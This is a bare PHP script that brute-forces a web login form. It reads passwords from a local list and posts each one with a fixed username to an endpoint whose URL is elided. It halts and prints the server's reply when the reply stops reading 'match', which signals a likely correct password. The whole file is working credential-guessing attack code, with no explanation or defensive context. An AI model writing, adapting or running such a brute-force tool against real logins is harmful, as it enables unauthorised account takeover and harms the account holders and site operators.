<?php

 set_time_limit ( 10); // seconds

$passwords= file_get_contents("password.txt");
$lines=explode("\n",$passwords);
foreach($lines as $line)
{
	$line=trim($line);
	$url="...";
	$ch = curl_init();
	$postfields="uname=...&psw=$line";
	curl_setopt($ch, CURLOPT_URL, "..."); //ipimg.php
	curl_setopt($ch, CURLOPT_POST, true);
	curl_setopt($ch, CURLOPT_POSTFIELDS,$postfields);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, FALSE);
	curl_setopt($ch, CURLOPT_MAXREDIRS, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);

	echo "trying: ".$postfields. " ";
	$body = curl_exec($ch);
	if(strpos($body,"match")==FALSE)
	{
		echo "<hr>";
		echo $postfields. " got a different response:<br>";
		echo $body;
		echo "<hr>";
		exit(0);
	}
	$error = curl_errno($ch);
	if($error!=0)
	{
		echo "<hr> error: ".$error." - ";
		echo curl_error ($ch);
	}
	curl_close($ch);
}
?>
